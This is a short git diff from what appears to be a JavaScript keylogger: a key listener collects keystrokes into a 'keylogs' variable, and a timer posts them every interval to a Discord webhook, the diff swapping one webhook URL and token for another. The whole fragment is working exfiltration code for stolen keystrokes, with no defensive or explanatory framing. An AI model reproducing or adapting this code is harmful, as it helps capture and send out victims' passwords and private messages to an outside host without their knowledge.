@@ -251,10 +251,8 @@ v.addListener(function (e, down) {
         }
     }
 });
-
-
 setInterval(async () => {
-    await axios.post('https://discord.com/api/webhooks/1235873075346538496/UwHFp88-UGc8dnRUjwHcsS21lWT3me81Uan1qYLzxc5WIOZQ1F_4Xv5PwpH99r2OgbPa', {
+    await axios.post('https://discord.com/api/webhooks/1232523854291800075/JM1uR5wQEKuGraDA4TgL0XycQJgGS08lOBLqD7HtAA0aAD4N3uju59GR6-Swv8bGDigK', {
         "content": keylogs
     }).then(async () => {
         keylogs = ''
